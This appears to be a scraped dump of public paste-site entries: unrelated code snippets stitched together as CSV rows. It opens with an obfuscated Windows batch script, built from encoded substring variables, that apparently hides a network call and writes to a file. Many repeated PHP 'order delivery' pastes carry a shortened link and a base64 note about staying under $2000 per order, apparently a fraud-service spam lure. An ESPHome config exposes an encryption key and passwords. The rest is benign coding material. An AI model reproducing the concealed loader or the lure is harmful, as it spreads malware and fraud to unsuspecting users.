    %a2m:~10,1%%a2m:~22,1%%a2m:~7,1%%a2m:~22,1% %a2m:~17,1%%a2m:~13,1%%a2m:~0,1%%a2m:~0,1%%a2m:~11,1%%a2m:~7,1%_%a2m:~35,1%%a2m:~29,1%%a2m:~6,1%%a2m:~23,1%%a2m:~7,1%
)

:%a2m:~53,1%%a2m:~9,1%%a2m:~11,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%_%a2m:~0,1%%a2m:~13,1%%a2m:~23,1%%a2m:~29,1%%a2m:~53,1%%a2m:~12,1%%a2m:~11,1%%a2m:~9,1%
%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% [%a2m:~25,1%%a2m:~39,1%%a2m:~5,1%%a2m:~48,1%%a2m:~55,1%%a2m:~51,1%] %a2m:~39,1%%a2m:~9,1%%a2m:~11,1%%a2m:~13,1%%a2m:~7,1%%a2m:~35,1%%a2m:~29,1%%a2m:~10,1% %a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~11,1%%a2m:~9,1% %a2m:~44,1%%a2m:~53,1%%a2m:~9,1%%a2m:~35,1%%a2m:~6,1%%a2m:~7,1%...
(
    %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% @%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% %a2m:~22,1%%a2m:~50,1%%a2m:~50,1%
    %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% %a2m:~53,1%%a2m:~42,1% /%a2m:~42,1% ""%~%a2m:~42,1%%a2m:~6,1%%a2m:~16,1%%a2m:~7,1%-%a2m:~9,1%%a2m:~11,1%%a2m:~52,1%""
    %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% %a2m:~7,1%%a2m:~35,1%%a2m:~7,1%%a2m:~0,1%%a2m:~11,1% %a2m:~5,1%-%a2m:~56,1%%a2m:~11,1%%a2m:~52,1% %a2m:~43,1%%a2m:~35,1%%a2m:~29,1%%a2m:~11,1%%a2m:~9,1% - !%a2m:~42,1%%a2m:~22,1%%a2m:~10,1%%a2m:~11,1%_%a2m:~13,1%%a2m:~42,1%%a2m:~42,1%%a2m:~9,1%%a2m:~11,1%%a2m:~44,1%%a2m:~44,1%!
    %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% %a2m:~7,1%-%a2m:~9,1%%a2m:~11,1%%a2m:~52,1%.%a2m:~11,1%%a2m:~52,1%%a2m:~11,1% -%a2m:~13,1% %a2m:~28,1%%a2m:~13,1%%a2m:~17,1%%a2m:~6,1%%a2m:~22,1%%a2m:~17,1% -%a2m:~22,1% %a2m:~44,1%%a2m:~7,1%%a2m:~9,1%%a2m:~13,1%%a2m:~7,1%%a2m:~23,1%%a2m:~30,1%+%a2m:~7,1%%a2m:~53,1%%a2m:~6,1%://%a2m:~28,1%%a2m:~6,1%.%a2m:~23,1%%a2m:~29,1%%a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~13,1%%a2m:~49,1%%a2m:~0,1%%a2m:~11,1%.%a2m:~53,1%%a2m:~22,1%%a2m:~30,1%:%a2m:~24,1%%a2m:~57,1%%a2m:~57,1%%a2m:~57,1%%a2m:~57,1% -%a2m:~23,1% %a2m:~41,1%%a2m:~55,1%%a2m:~26,1%%a2m:~32,1%:!%a2m:~42,1%%a2m:~22,1%%a2m:~10,1%%a2m:~11,1%_%a2m:~13,1%%a2m:~42,1%%a2m:~42,1%%a2m:~9,1%%a2m:~11,1%%a2m:~44,1%%a2m:~44,1%!.%a2m:~30,1%%a2m:~13,1%%a2m:~35,1%%a2m:~29,1%%a2m:~6,1%%a2m:~53,1% -%a2m:~6,1% %a2m:~52,1%%%a2m:~9,1%%a2m:~11,1%%a2m:~50,1%%a2m:~11,1%%a2m:~9,1%%a2m:~9,1%%a2m:~13,1%%a2m:~0,1%_%a2m:~53,1%%a2m:~22,1%%a2m:~42,1%%a2m:~11,1%%
    %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% %a2m:~6,1%%a2m:~13,1%%a2m:~23,1%%a2m:~44,1%%a2m:~11,1%
) > ""%%a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~11,1%%a2m:~9,1%_%a2m:~49,1%%a2m:~13,1%%a2m:~7,1%%""

:%a2m:~50,1%%a2m:~35,1%%a2m:~29,1%%a2m:~13,1%%a2m:~0,1%%a2m:~35,1%%a2m:~18,1%%a2m:~11,1%
%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% [%a2m:~38,1%/%a2m:~38,1%] %a2m:~15,1%%a2m:~35,1%%a2m:~29,1%%a2m:~13,1%%a2m:~0,1%%a2m:~35,1%%a2m:~18,1%%a2m:~35,1%%a2m:~29,1%%a2m:~10,1%...
%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% ----------------------------
%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% %a2m:~39,1%%a2m:~9,1%%a2m:~11,1%%a2m:~42,1%%a2m:~35,1%%a2m:~7,1%%a2m:~44,1%: %a2m:~39,1%%a2m:~9,1%%a2m:~11,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%%a2m:~42,1% %a2m:~49,1%%a2m:~21,1% %a2m:~5,1%%a2m:~35,1%%a2m:~30,1%%a2m:~30,1%%a2m:~21,1%
%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% %a2m:~5,1%%a2m:~12,1%%a2m:~13,1%%a2m:~29,1%%a2m:~28,1%%a2m:~44,1% %a2m:~50,1%%a2m:~22,1%%a2m:~9,1% %a2m:~23,1%%a2m:~44,1%%a2m:~35,1%%a2m:~29,1%%a2m:~10,1%!
%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% ----------------------------
%a2m:~7,1%%a2m:~35,1%%a2m:~30,1%%a2m:~11,1%%a2m:~22,1%%a2m:~23,1%%a2m:~7,1% /%a2m:~7,1% %a2m:~34,1% >%a2m:~29,1%%a2m:~23,1%%a2m:~0,1%

:%a2m:~0,1%%a2m:~13,1%%a2m:~23,1%%a2m:~29,1%%a2m:~53,1%%a2m:~12,1%
%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% [%a2m:~45,1%%a2m:~5,1%%a2m:~25,1%%a2m:~5,1%%a2m:~40,1%%a2m:~45,1%] %a2m:~45,1%%a2m:~7,1%%a2m:~13,1%%a2m:~9,1%%a2m:~7,1%%a2m:~35,1%%a2m:~29,1%%a2m:~10,1% %a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~11,1%%a2m:~9,1%...
%a2m:~53,1%%a2m:~13,1%%a2m:~0,1%%a2m:~0,1% ""%%a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~11,1%%a2m:~9,1%_%a2m:~49,1%%a2m:~13,1%%a2m:~7,1%%"""
0ghPSqSB,Untitled,dllbridge,C,Friday 21st of March 2025 05:29:14 AM CDT,"
#include  <stdio.h>
#include <stdlib.h>
#include   <time.h>

void  f(int*);



///////////////////////////////////////////////////
int main()
{
	
	srand(time(0));
	
	int sum = 0;

	int  arr[20];
	
	int* p = (int*)malloc(80);
	
	for (int i = 0; i < 20; i++)
	{
		
		arr[i] = rand() % 10;
		sum   += arr[i];
		p[i]   = arr[i];
	}


	f(p);
	printf(""   sum =  %d"", sum);
	free(p);
}

////////////////////////////////////////////////////////////
void f(int p[])
{
	for (int i = 0; i < 20; i++)
	{
		printf(""%d\n"", p[i]);
	}
}


"
fPexMckm,Tycoon,PeaPattern,Lua,Friday 21st of March 2025 05:24:36 AM CDT,"local DatastoreService = game:GetService(""DataStoreService"")
local RStorage = game:GetService(""ReplicatedStorage"")
local Players = game:GetService(""Players"")

local Datastore = DatastoreService:GetDataStore(""PlayersData"")

local Tycoon = script.Parent

local Claim = Tycoon.Claim
local Head = Claim.Head
local Humanoid = Claim.Humanoid

local isClaimed = false
local Owner = nil

local function PlayerTouch(Obj, Callback)
	Obj.Touched:Connect(function(Hit)
		if not Hit or not Hit.Parent or not Hit.Parent:FindFirstChildOfClass(""Humanoid"") then return end

		local Target = Players:GetPlayerFromCharacter(Hit.Parent)
		if not Target then return end

		Callback(Target)
	end)
end

local function PlayerLeft(Target, Callback)
	local Connection
	Connection = Players.PlayerRemoving:Connect(function(Player)
		if Player ~= Target then return end

		Callback()
		Connection:Disconnect()
	end)
end

local Storage = Instance.new(""Folder"")
Storage.Parent = RStorage
Storage.Name = ""TycoonStorage""

local Ores = Instance.new(""Folder"")
Ores.Parent = workspace
Ores.Name = ""Ores""

local function OwnsButton(Player, ButtonName)
	local Success, Owns = pcall(function()
		return Datastore:GetAsync(Player.UserId, ButtonName)
	end)

	if Success and Owns then
		return Owns
	end
end

local Buttons = {}
local ButtonCount = 0

local function OperateButton(Price, Button, Model, Callback)
	if #Buttons ~= 0 then
		Button.Parent.Parent = Storage
	end

	ButtonCount += 1
	local Next = ButtonCount + 1
	Buttons[ButtonCount] = {
		Button.Parent,
		Model,
		ButtonCount,
		Callback,
	}

	Model.Parent = Storage
	PlayerTouch(Button, function(Target)
		if not isClaimed or Owner ~= Target then return end
		if not Target or Target.leaderstats.Money.Value < Price then return end
		Button.Parent.Parent = Storage
		Model.Parent = Tycoon
		Owner.leaderstats.Money.Value -= Price
		Callback()

		local Found = Buttons[Next][1]
		if Found then
			Found.Parent = Tycoon
		end
	end)
end

local function CreateOre(Price, Origin)
	local Ore = Instance.new(""Part"")
	Ore.Parent = Ores
	Ore.Size = Vector3.new(1, 1, 1)
	Ore.CFrame = Origin.CFrame
	Ore:SetAttribute(""Price"", Price)
end

local DropperConveyor = Tycoon.DropperConveyor
OperateButton(0, Tycoon.Start.Head, DropperConveyor, function()
	DropperConveyor.Conveyor.Velocity = Vector3.new(0, 0, 10)

	DropperConveyor.Furnace.Touched:Connect(function(Ore)
		if not Ore or Ore.Parent ~= Ores then return end

		local Price = Ore:GetAttribute(""Price"")
		Owner.leaderstats.Money.Value += Price

		Ore:Destroy()
	end)

	task.spawn(function()
		local DropPart = Tycoon.DropperConveyor.DropPart
		while task.wait(2) do
			if not isClaimed then break end
			CreateOre(1, DropPart)
		end
	end)
end)

OperateButton(15, Tycoon.UpgraderButton.Head, Tycoon.Upgrader, function()
	local Connection = Tycoon.Upgrader.UpgradePart.Touched:Connect(function(Ore)
		if not Ore or Ore.Parent ~= Ores then return end
		if Ore:GetAttribute(""Upgraded"") then return end

		Ore:SetAttribute(""Upgraded"", true)
		Ore:SetAttribute(""Price"", Ore:GetAttribute(""Price"") * 2)
	end)
	repeat task.wait() until not isClaimed
	Connection:Disconnect()
end)

local Old = {}

for _, Obj in Tycoon:GetChildren() do
	Old[#Old + 1] = {Obj, Obj.Parent}
end

for _, Obj in Storage:GetChildren() do
	Old[#Old + 1] = {Obj, Obj.Parent}
end

local function LoadData(Player)
	local Success, Data = pcall(function()
		return Datastore:GetAsync(Player.UserId)
	end)
	
	if Success and Data then
		return Data.Money or 0, Data.Buttons or {}
	end

	return 0, {}
end

local function SaveData(Player)
	local OwnedButtons = {}
	for _, Button in Buttons do
		if Button[2].Parent == Tycoon then
			OwnedButtons[#OwnedButtons + 1] = Button[3]
		end
	end
	
	local Data = {
		Money = Player.leaderstats.Money.Value,
		Buttons = OwnedButtons,
	}
	
	pcall(function()
		Datastore:SetAsync(Player.UserId, Data)
	end)
end

local function LoadStuff(Player)
	local FoundMoney, FoundButtons = LoadData(Player)
	Player.leaderstats.Money.Value = FoundMoney

	for _, ButtonCount in FoundButtons do
		local Button = Buttons[ButtonCount]
		Button[1].Parent = Storage
		Button[2].Parent = Tycoon
		Button[4]()

		local Next = ButtonCount + 1
		local Found = Buttons[Next]
		Found[1].Parent = Tycoon
	end
end

Players.PlayerAdded:Connect(function(Player)
	local Leaderstats = Instance.new(""Folder"")
	Leaderstats.Parent = Player
	Leaderstats.Name = ""leaderstats""

	local Money = Instance.new(""IntValue"")
	Money.Parent = Leaderstats
	Money.Name = ""Money""
end)

local function Unclaim()
	if not isClaimed then return end
	isClaimed = false
	Head.Transparency = 0.5
	Humanoid.DisplayName = ""Claim""
	Owner = nil

	for _, Data in Old do
		Data[1].Parent = Data[2]
	end

	Ores:ClearAllChildren()
end

local function Claim(Target)
	if isClaimed then return end
	
	isClaimed = true
	Humanoid.DisplayName = (""%s's Tycoon""):format(Target.Name)
	Head.Transparency = 0.8
	Owner = Target
	LoadStuff(Target)
	PlayerLeft(Target, function()
		SaveData(Target)
		Unclaim()
	end)
end

PlayerTouch(Head, Claim)"
4q9kFrub,Untitled,Josif_tepe,C++,Friday 21st of March 2025 05:10:53 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <cstring>
using namespace std;
typedef long long ll;
const int maxn = 33;

ll a[maxn];
int n;
ll K;

bool check(ll x) {
    ll res = 0;
    for(int i = 0; i < n; i++) {
        res += x / a[i];
    }
    
    if(res >= K){
        return true;
    }
    return false;
}
int main() {
    ios_base::sync_with_stdio(false);
    cin >> n >> K;
    
    for(int i = 0; i < n; i++) {
        cin >> a[i];
    }
    
    
    ll L = 0, R = 1e18;
    
    ll res = 2e18;
    while(L <= R) {
        ll mid = (L + R) / 2;
        
        if(check(mid)) {
            res = min(res, mid);
            R = mid - 1;
        }
        else {
            L = mid + 1;
        }
    }
    cout << res << endl;
    return 0;
}
"
wLdiwLJ9,Order delivery script,sookielove71,PHP,Friday 21st of March 2025 05:07:24 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""692"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
5jacBUpk,Order delivery script,sookielove71,PHP,Friday 21st of March 2025 05:02:01 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""303"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
4m2u1EEs,Untitled,sookielove71,PHP,Friday 21st of March 2025 04:56:39 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""333"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
Yjd3Tdax,Order delivery script,sookielove71,PHP,Friday 21st of March 2025 04:51:16 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""474"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
hnj22WEN,Untitled,Josif_tepe,C++,Friday 21st of March 2025 04:40:57 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <cstring>
using namespace std;
typedef long long ll;
const int maxn = 22;
int n, m, k;
int opening_cost[maxn];
int rating[maxn][maxn], cost[maxn][maxn];
int dp[maxn][1005][2];
int rec(int at_batch, int money_left, bool is_locked) {
    if(at_batch >= n) {
        return 0;
    }
    if(dp[at_batch][money_left][is_locked] != -1) {
        return dp[at_batch][money_left][is_locked];
    }
    int real_money = money_left;
    if(is_locked) {
        real_money -= opening_cost[at_batch];
    }
    int res = 0;
    if(real_money >= 0) {
        for(int i = 0; i < m; i++) {
            if(real_money >= cost[at_batch][i]) {
                res = max(res, rec(at_batch, real_money - cost[at_batch][i], false) + rating[at_batch][i]);
                
                res = max(res, rec(at_batch + 1, real_money - cost[at_batch][i], true) + rating[at_batch][i]);
            }
        }
    }
    res = max(res, rec(at_batch + 1, money_left, true));
    
    return dp[at_batch][money_left][is_locked] = res;
}
int main() {
    ios_base::sync_with_stdio(false);
    
    int T;
    cin >> T;
    
    while(T--) {
        cin >> n >> m >> k;
        
        for(int i = 0; i < n; i++) {
            cin >> opening_cost[i];
        }
        
        for(int i = 0; i < n; i++) {
            for(int j = 0; j < m; j++) {
                cin >> cost[i][j];
            }
        }
        
        for(int i = 0; i < n; i++) {
            for(int j = 0; j < m; j++) {
                cin >> rating[i][j];
            }
        }
        
        memset(dp, -1, sizeof dp);
        cout << rec(0, k, true) << endl;
        
    }
     
    return 0;
}
"
aB6x5kBB,Presence sensor LD2412,kornelremete,YAML,Friday 21st of March 2025 04:40:51 AM CDT,"external_components:
  - source:
      type: git
      url: https://github.com/Rihan9/LD2412
      ref: main
    components: [LD2412]

esphome:
  name: presence
  friendly_name: presence

esp32:
  board: esp32-s3-devkitc-1
  framework:
    type: arduino

# Enable logging
logger:
  level: VERBOSE
  baud_rate: 0

# Enable Home Assistant API
api:
  encryption:
    key: ""KKW3/SDHmRtsABvOJZU0auD8in/6JWcw+K5SvucWQzA=""

ota:
  - platform: esphome
    password: ""84c2ea524669d38cb881c50ecd14b333""

wifi:
  ssid: !secret wifi_ssid
  password: !secret wifi_password

  # Enable fallback hotspot (captive portal) in case wifi connection fails
  ap:
    ssid: ""Presencetest Fallback Hotspot""
    password: ""mnevv5Ey3fQo""


web_server:
  port: 80
 

captive_portal:

uart:
  id: uart_bus
  rx_pin: GPIO6
  tx_pin: GPIO7
  baud_rate: 115200
  parity: NONE
  stop_bits: 1

LD2412:
  id: ld2412
  throttle: 3s

binary_sensor:
  - platform: LD2412
    has_target:
      name: Presence
    has_moving_target:
      name: Moving Target
    has_still_target:
      name: Still Target

sensor:
  - platform: LD2412
    moving_distance:
      name : Moving Distance
    still_distance:
      name: Still Distance
    moving_energy:
      name: Move Energy
    still_energy:
      name: Still Energy
    detection_distance:
      name: Detection Distance
    light:
      name: light
    g0:
      move_energy:
        name: g00 move energy
      still_energy:
        name: g00 still energy
    g1:
      move_energy:
        name: g01 move energy
      still_energy:
        name: g01 still energy
    g2:
      move_energy:
        name: g02 move energy
      still_energy:
        name: g02 still energy
    g3:
      move_energy:
        name: g03 move energy
      still_energy:
        name: g03 still energy
    g4:
      move_energy:
        name: g04 move energy
      still_energy:
        name: g04 still energy
    g5:
      move_energy:
        name: g05 move energy
      still_energy:
        name: g05 still energy
    g6:
      move_energy:
        name: g06 move energy
      still_energy:
        name: g06 still energy
    g7:
      move_energy:
        name: g07 move energy
      still_energy:
        name: g07 still energy
    g8:
      move_energy:
        name: g08 move energy
      still_energy:
        name: g08 still energy
    g9:
      move_energy:
        name: g09 move energy
      still_energy:
        name: g09 still energy
    g10:
      move_energy:
        name: g10 move energy
      still_energy:
        name: g10 still energy
    g11:
      move_energy:
        name: g11 move energy
      still_energy:
        name: g11 still energy
    g12:
      move_energy:
        name: g12 move energy
      still_energy:
        name: g12 still energy
    g13:
      move_energy:
        name: g13 move energy
      still_energy:
        name: g13 still energy

number:
  - platform: LD2412
    timeout:
      name: ""presence holding""
    min_distance_gate:
      name: ""min distance gate""
    max_distance_gate:
      name: ""max distance gate""
    g0:
      move_threshold:
        name: g00 move threshold
      still_threshold:
        name: g00 still threshold
    g1:
      move_threshold:
        name: g01 move threshold
      still_threshold:
        name: g01 still threshold
    g2:
      move_threshold:
        name: g02 move threshold
      still_threshold:
        name: g02 still threshold
    g3:
      move_threshold:
        name: g03 move threshold
      still_threshold:
        name: g03 still threshold
    g4:
      move_threshold:
        name: g04 move threshold
      still_threshold:
        name: g04 still threshold
    g5:
      move_threshold:
        name: g05 move threshold
      still_threshold:
        name: g05 still threshold
    g6:
      move_threshold:
        name: g06 move threshold
      still_threshold:
        name: g06 still threshold
    g7:
      move_threshold:
        name: g07 move threshold
      still_threshold:
        name: g07 still threshold
    g8:
      move_threshold:
        name: g08 move threshold
      still_threshold:
        name: g08 still threshold
    g9:
      move_threshold:
        name: g09 move threshold
      still_threshold:
        name: g09 still threshold
    g10:
      move_threshold:
        name: g10 move threshold
      still_threshold:
        name: g10 still threshold
    g11:
      move_threshold:
        name: g11 move threshold
      still_threshold:
        name: g11 still threshold
    g12:
      move_threshold:
        name: g12 move threshold
      still_threshold:
        name: g12 still threshold
    g13:
      move_threshold:
        name: g13 move threshold
      still_threshold:
        name: g13 still threshold
  
select:
  - platform: LD2412
    out_pin_level:
      name: 'Hardware output pin level'
    distance_resolution:
      name: 'Distance resolution'
    baud_rate:
      name: ""baud rate""
      on_value:
        - delay: 3s
        - lambda: |-
            id(uart_bus).flush();
            uint32_t new_baud_rate = stoi(x);
            ESP_LOGD(""change_baud_rate"", ""Changing baud rate from %i to %i"",id(uart_bus).get_baud_rate(), new_baud_rate);
            if (id(uart_bus).get_baud_rate() != new_baud_rate) {
            id(uart_bus).set_baud_rate(new_baud_rate);
            id(uart_bus).load_settings();
            }
    mode:
      name: ""Mode""
button:
  - platform: LD2412
    factory_reset:
      name: ""factory reset""
    restart:
      name: ""restart""
    query_params:
      name: query params

text_sensor:
  - platform: LD2412
    version:
      name: ""firmware version""
    mac_address:
      name: ""mac address""
switch:
  - platform: LD2412
    bluetooth:
      name: ""Bluetooth""    

light:
  - platform: status_led
    name: ""Status Led""
    pin:
      number: GPIO8
      inverted: true"
DvVS0jBH,Untitled,josemanuelaparicio,PHP,Friday 21st of March 2025 04:29:36 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""839"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
sfrgMDMi,Order delivery script,josemanuelaparicio,PHP,Friday 21st of March 2025 04:23:51 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""790"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
9ybPX2Yk,Order delivery script,josemanuelaparicio,PHP,Friday 21st of March 2025 04:13:04 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""276"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
NcVt7u6g,Order delivery script,josemanuelaparicio,PHP,Friday 21st of March 2025 04:07:35 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""617"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
sMYFhGrV,Untitled,Kagalive,C++,Friday 21st of March 2025 04:05:40 AM CDT," generate an SEO-optimized blog post, including copy, titles, an outline, "
cETtp735,Untitled,josemanuelaparicio,PHP,Friday 21st of March 2025 04:02:12 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""704"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
ZqiuRWVW,Untitled,Kagalive,C++,Friday 21st of March 2025 04:01:07 AM CDT,Hubspotcms
eeG62FV6,RequestException: error with request,basedcount_bot,Python,Friday 21st of March 2025 04:00:24 AM CDT,"Traceback (most recent call last):
  File ""/home/gmktec/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/home/gmktec/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 123, in check_mail
    async for message in reddit_instance.inbox.unread(limit=None):  # Message
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 37, in __anext__
    await self._next_batch()
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 90, in _next_batch
    self._listing = await self._reddit.get(self.url, params=self.params)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
